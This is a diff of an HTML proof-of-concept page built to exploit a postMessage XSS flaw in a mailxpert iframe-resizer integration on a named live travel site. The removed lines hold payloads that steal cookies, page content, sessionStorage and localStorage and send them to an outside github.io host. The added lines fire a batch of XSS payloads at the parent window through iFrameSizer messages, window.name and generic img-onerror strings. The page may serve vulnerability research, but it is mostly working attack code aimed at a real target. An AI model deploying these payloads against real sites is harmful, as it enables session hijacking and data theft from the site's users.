@@ -1,77 +1,94 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Newsletter</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #0a0a0a; color: #0f0; }
-        .log { background: #111; padding: 15px; border-radius: 8px; margin: 10px 0; border-left: 4px solid #0f0; }
-        pre { background: #000; padding: 10px; overflow-x: auto; border-radius: 4px; }
-        h1 { color: #f00; text-shadow: 0 0 10px #f00; }
-        .alert { background: #f00; color: white; padding: 20px; border-radius: 8px; margin: 10px 0; font-size: 18px; }
-    </style>
-</head>
-<body>
-    <h1>💀 XSS EXPLOITED - CRITICAL</h1>
-    
-    <div class="alert">
-        <strong>🔴 FULL XSS ACHIEVED</strong><br>
-        Executing in parent context: dertour-suisse.com
-    </div>
-    
-    <h2>📥 Captured Data</h2>
-    <div id="captured"></div>
-    
-    <h2>🍪 Stolen Cookies</h2>
-    <div id="cookies"></div>
+<head><title>XSS</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+<h1>🔴 Parent Context XSS Exploits</h1>
+<div id="log"></div>
+<script>
+const log = document.getElementById('log');
+function l(m) { log.innerHTML += '<p>' + m + '</p>'; }
 
-    <script>
-    const capturedDiv = document.getElementById('captured');
-    const cookiesDiv = document.getElementById('cookies');
-    
-    function log(title, data) {
-        const div = document.createElement('div');
-        div.className = 'log';
-        div.innerHTML = '<strong>' + title + '</strong><pre>' + 
-            (typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data)) + '</pre>';
-        capturedDiv.appendChild(div);
-    }
+// Method 1: Try to access parent directly (will fail due to SOP, but let's confirm)
+try {
+    l('Parent domain: ' + window.parent.document.domain);
+} catch(e) {
+    l('❌ Direct access blocked (expected): ' + e.message);
+}
 
-    // Capture postMessage
-    window.addEventListener('message', function(event) {
-        log('📥 Parent URL Leaked', event.data);
+// Method 2: Use window.open with javascript: URI targeting parent's name
+// If parent has a name, we might be able to target it
+l('Our window name: ' + window.name);
+l('Parent frames length: ' + window.parent.length);
+
+// Method 3: Exploit the postMessage handlers
+// Looking at the code, when checkOrigin is false (default), messages are accepted from any origin
+// The message handler does: u[L].targetOrigin = checkOrigin ? remoteHost : "*"
+// For our injected iframe, remoteHost will be our github pages URL
+
+function sendToParent(msg) {
+    window.parent.postMessage(msg, '*');
+    l('📤 Sent: <code>' + msg.substring(0, 80) + '...</code>');
+}
+
+// The key insight: The iframe ID needs to match what's registered in the parent
+// When mailxpert creates the iframe, it registers it with the ID from the script params
+// Let's try different IDs and message types
+
+const attacks = [
+    // Try with formContentId (the actual ID used)
+    '[iFrameSizer]formContentId:100:100:init',
+    
+    // The "message" type calls onMessage callback with JSON.parse(data)
+    // If the onMessage handler uses innerHTML or eval, we win
+    '[iFrameSizer]formContentId:0:0:message:{"html":"<img src=x onerror=alert(parent.document.domain)>"}',
+    
+    // Try close - removes iframe from DOM (DoS)
+    // '[iFrameSizer]formContentId:0:0:close',
+    
+    // Try resize with script in dimensions (unlikely but worth trying)
+    '[iFrameSizer]formContentId:"><img src=x onerror=alert(1)>:100:init',
+];
+
+setTimeout(() => {
+    attacks.forEach((a, i) => setTimeout(() => sendToParent(a), i * 300));
+}, 500);
+
+// Method 4: Exploit via window.name
+// Set our window.name to XSS payload, then trigger parent to read it
+window.name = '<img src=x onerror=alert(document.domain)>';
+l('Set window.name to XSS payload');
+
+// Method 5: Check if parent has any vulnerable global handlers
+// by sending various message formats
+setTimeout(() => {
+    // Generic postMessage XSS attempts
+    const genericPayloads = [
+        '<img src=x onerror=alert(1)>',
+        '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
+        {'type': 'xss', 'payload': '<script>alert(1)</script>'},
+        {'innerHTML': '<img src=x onerror=alert(document.domain)>'},
+    ];
+    
+    genericPayloads.forEach((p, i) => {
+        setTimeout(() => {
+            window.parent.postMessage(p, '*');
+            l('📤 Generic: ' + JSON.stringify(p).substring(0, 50));
+        }, 2000 + i * 200);
     });
+}, 1000);
 
-    // The working XSS payload - send via postMessage
-    function exploit() {
-        if (window.parent === window) return;
-        
-        const iframeId = 'formContentId';
-        
-        // Payload that worked - alert(1)
-        // Now let's escalate to cookie theft
-        const payloads = [
-            // Cookie stealer
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="new Image().src=\'https://jessisnofy-ai.github.io/mailxpert-poc/c.gif?\'+document.cookie">',
-            
-            // DOM extraction
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="fetch(\'https://jessisnofy-ai.github.io/mailxpert-poc/d.gif?\'+btoa(document.body.innerHTML.substring(0,500)))">',
-            
-            // Session storage
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="fetch(\'https://jessisnofy-ai.github.io/mailxpert-poc/s.gif?\'+btoa(JSON.stringify(sessionStorage)))">',
-            
-            // Local storage
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="fetch(\'https://jessisnofy-ai.github.io/mailxpert-poc/l.gif?\'+btoa(JSON.stringify(localStorage)))">',
-            
-            // Show domain as proof
-            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror="alert(\'XSS on: \'+document.domain+\' Cookies: \'+document.cookie)">',
-        ];
-        
-        // Send the cookie stealer payload
-        window.parent.postMessage(payloads[4], '*');
-        log('🎯 XSS Payload Sent', payloads[4]);
+// Method 6: Try to call functions exposed on parent window
+setTimeout(() => {
+    try {
+        // If iFrameResize exposes methods
+        l('Checking for exposed parent methods...');
+        sendToParent({type: 'mx:formEditor:page:changed', xss: '<img src=x onerror=alert(1)>'});
+    } catch(e) {
+        l('Error: ' + e.message);
     }
+}, 3000);
 
-    setTimeout(exploit, 500);
-    </script>
+l('⏳ Sending XSS payloads to parent...');
+</script>
 </body>
 </html>
